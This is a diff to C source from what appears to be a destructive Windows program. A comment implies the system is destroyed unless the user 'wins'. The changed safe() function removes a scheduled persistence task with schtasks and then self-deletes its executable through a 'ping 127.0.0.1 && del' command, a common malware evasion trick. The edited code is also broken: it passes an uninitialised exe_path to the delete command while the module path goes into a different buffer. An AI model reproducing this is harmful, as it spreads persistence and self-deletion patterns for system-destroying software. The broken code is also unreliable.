@@ -81,15 +81,15 @@ void task_sch() {
 // so if you win your system isnt destroyed
 void safe() {
     // rm scheduled tsk
-    char cmd[256];
-    sprintf(cmd, "schtasks /delete /tn \"%s\" /f" rand_nm);
+    char cmd[MAX_PATH + 256];
+    sprintf(cmd, "schtasks /delete /tn \"%s\" /f", rand_nm);
     system(cmd);
     
     //delete itself
     //uses localhost as a delay method 
-    char cmd[MAX_PATH];
     GetModuleFileNameA(NULL, cmd, MAX_PATH);
     char rm_cmd[MAX_PATH + 128];
+    char exe_path[MAX_PATH];
     sprintf(rm_cmd,
         "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", exe_path);
     system(rm_cmd);
